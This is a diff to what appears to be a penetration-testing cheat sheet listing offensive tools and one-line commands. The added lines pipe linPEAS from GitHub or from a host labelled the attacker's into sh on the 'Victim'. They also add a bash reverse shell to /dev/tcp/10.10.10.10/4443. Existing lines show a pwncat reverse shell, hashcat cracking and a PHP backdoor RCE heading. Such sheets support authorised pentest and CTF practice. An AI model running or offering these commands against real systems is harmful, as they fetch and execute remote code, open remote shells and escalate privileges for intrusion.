@@ -8,7 +8,18 @@ https://github.com/21y4d/nmapAutomator
 ##### PWNCAT - Unbreakable Persistent Reverse Shell (Also IDS/Firewall Evasion :)
 https://github.com/cytopia/pwncat
 
+##### Linpeas
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
+    From github
+    curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+    
+    Local network
+    sudo python -m SimpleHTTPServer 80 #Host
+    curl 10.10.10.10/linpeas.sh | sh #Victim
+
+##### Linux Privilege Checker
+https://github.com/sleventyeleven/linuxprivchecker
 
 Category | Command Examples
 ------------ | -------------
@@ -19,6 +30,8 @@ CRACKING | hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst
 SHELL | Resolve "TERM environment variable not set":  *$ *export TERM=xterm**
 SHELL | Fully interactive shell (Python): *$ python3 -c 'import pty; pty.spawn("/bin/bash")'*
 SHELL | PWNCAT Ex. *$ pwncat -e '/bin/bash' example.com 4444*
+SHELL | Reverse Bash Shell *$ bash -i >& /dev/tcp/10.10.10.10/4443 0>&1*
+
 
 ## Exploits
 PHP 8.1.0-dev Backdoor RCE
